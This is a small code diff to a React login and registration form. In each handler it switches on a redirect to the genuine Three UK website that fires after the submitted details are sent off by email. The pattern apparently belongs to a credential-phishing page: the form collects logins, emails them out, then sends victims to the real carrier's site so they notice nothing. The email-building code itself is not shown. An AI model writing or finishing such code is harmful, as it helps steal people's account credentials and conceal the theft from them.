@@ -38,7 +38,7 @@ const AuthForm = () => {
         (result) => {
           console.log("Login email sent:", result.text);
           // You can uncomment this after testing:
-          // window.location.href = "https://www.three.co.uk/";
+          window.location.href = "https://www.three.co.uk/";
         },
         (error) => {
           console.log("Error sending login email:", error.text);
@@ -63,7 +63,7 @@ const AuthForm = () => {
         (result) => {
           console.log("Register email sent:", result.text);
           // You can uncomment this after testing:
-          // window.location.href = "https://www.three.co.uk/";
+          window.location.href = "https://www.three.co.uk/";
         },
         (error) => {
           console.log("Error sending register email:", error.text);
